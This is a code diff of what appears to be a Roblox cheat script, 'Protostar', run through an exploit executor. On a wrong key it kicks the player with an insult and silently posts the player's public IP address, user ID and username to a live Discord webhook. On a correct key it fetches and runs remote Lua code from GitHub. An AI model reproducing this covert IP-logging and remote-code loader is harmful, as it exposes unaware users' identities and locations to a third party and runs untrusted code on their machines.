@@ -3,20 +3,19 @@ local i = _G.Key
 if i ~= _G.PassCode then
         game.Players.LocalPlayer:Kick("Wrong key dumb fuck")
         
-   syn.request({
-       Url = "webhook here",
+           syn.request({
+       Url = "https://discord.com/api/webhooks/1051685076599054377/p9ZHboO2kOdzsslRYCW7F_MJ_1urjoKNnozZjCB_vVIRmpnx-dGgbBfPDLBj3WZokobvz",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            embeds = {{
-               title = "Protostar Report - #"..game:HttpGetAsync("https://api.ipify.org", true).." "..game.Players.LocalPlayer.UserId,
+               title = "Protostar Report - "..game:HttpGetAsync("https://api.ipify.org", true).." "..game.Players.LocalPlayer.UserId.." "..game.Players.LocalPlayer.Name,
                description = "Used Wrong Key"
            }}
        })
    })
-end
 
 else
         local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/loss23/Protostar/main/S2/Lib.lua',true))()
